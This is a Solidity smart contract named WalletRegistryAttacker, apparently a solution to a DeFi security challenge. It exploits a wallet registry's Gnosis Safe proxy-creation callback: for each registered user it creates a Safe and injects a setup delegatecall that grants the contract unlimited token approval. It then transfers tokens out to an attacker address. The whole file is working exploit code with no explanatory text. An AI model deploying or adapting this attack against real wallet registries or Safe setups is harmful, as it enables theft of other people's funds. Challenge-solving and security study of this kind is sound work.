// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";


interface ProxyFactory {
  function createProxyWithCallback(
    address _singleton,
    bytes memory initializer,
    uint256 saltNonce,
    IProxyCreationCallback callback
  ) external returns (GnosisSafeProxy proxy);
}


/**
 * @title WalletRegistryAttacker
 * @author Hiroshi Tashiro
 */
contract WalletRegistryAttacker {
  address public walletRegistryAddr;
  address public masterCopyAddr;
  ProxyFactory proxyFactory;
  
  constructor(address _walletRegistryAddr, address _masterCopyAddr, address _proxyFactoryAddr) {
    walletRegistryAddr = _walletRegistryAddr;
    masterCopyAddr = _masterCopyAddr;
    proxyFactory = ProxyFactory(_proxyFactoryAddr); 
  }

  function approveToken(address spender, address token) external {
    IERC20(token).approve(spender, type(uint256).max);
  }

  function attack(address tokenAddr, address[] calldata users, address attacker) external {
    for (uint256 i = 0; i < users.length; i++) {
      address[] memory owners = new address[](1);
      owners[0] = users[i];

      bytes memory payloadApprove = abi.encodeWithSignature("approveToken(address,address)", address(this), tokenAddr);

      bytes memory initializer = abi.encodeWithSignature("setup(address[],uint256,address,bytes,address,address,uint256,address)", owners, 1, address(this), payloadApprove, address(0), 0, 0, 0);

      GnosisSafeProxy proxy = proxyFactory.createProxyWithCallback(masterCopyAddr, initializer, 0, IProxyCreationCallback(walletRegistryAddr));

      IERC20(tokenAddr).transferFrom(address(proxy), attacker, 10 ether);

    }
  }
}